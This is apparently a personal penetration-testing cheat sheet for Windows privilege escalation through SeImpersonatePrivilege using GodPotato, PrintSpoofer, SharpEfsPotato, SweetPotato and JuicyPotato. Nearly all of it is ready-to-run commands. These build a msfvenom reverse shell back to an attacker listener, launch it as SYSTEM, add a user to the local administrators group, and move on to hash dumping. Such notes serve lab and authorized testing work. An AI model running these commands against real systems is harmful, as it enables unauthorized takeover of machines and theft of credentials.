# Windows privesc: SeImpersonate and potatoes

## Check
whoami /priv
- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is listed: Disabled still counts
- [ ] IIS app pools, MSSQL, LOCAL SERVICE and NETWORK SERVICE hold it by default
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
dir C:\Windows\Microsoft.NET\Framework64
- [ ] v4.0.30319 there: GodPotato-NET4.exe; only v2.0.50727: GodPotato-NET35.exe

## A payload
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
rlwrap nc -lvnp <LPORT>
- [ ] 32-bit Windows: windows/shell_reverse_tcp instead

## GodPotato
At the pwn-broker prompt:
tool install godpotato
serve
serve files potato
On the target:
cd C:\Users\Public
- [ ] GodPotato-NET4.exe and rev.exe fetched here with the lines serve files gives
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Users\Public\rev.exe"
- [ ] whoami printed nt authority\system, and the shell came back
- [ ] Nothing printed: GodPotato-NET35.exe, then the tools below
Or an administrator instead of a shell, when I know <Username>'s password:
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators <Username> /add"

## The others
None of these is in pwn-shop: each goes in the target's upload/ folder first, and is fetched to C:\Users\Public.
- [ ] Use the 64-bit build on 64-bit Windows

## PrintSpoofer
Windows 10 and Server 2016 to 2019, with the Print Spooler running:
sc.exe query Spooler
.\PrintSpoofer64.exe -c "C:\Users\Public\rev.exe"
In a shell that keeps a console, such as a reverse shell:
.\PrintSpoofer64.exe -i -c cmd

## SharpEfsPotato
Through the EFS RPC interface, on current Windows:
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\rev.exe"

## SweetPotato
PrintSpoofer's method by default, or another with -e:
.\SweetPotato.exe -p C:\Users\Public\rev.exe
.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\rev.exe

## JuicyPotato, on old Windows
- [ ] Windows 10 1803 or Server 2016 and older: newer builds broke it
.\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\rev.exe
The default CLSID fails on some builds: one for the exact OS, from the project's CLSID list.
.\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\rev.exe -c "{THE-CLSID}"

## Afterwards
whoami
- [ ] nt authority\system: dump the hashes next, :Pb windows-creds
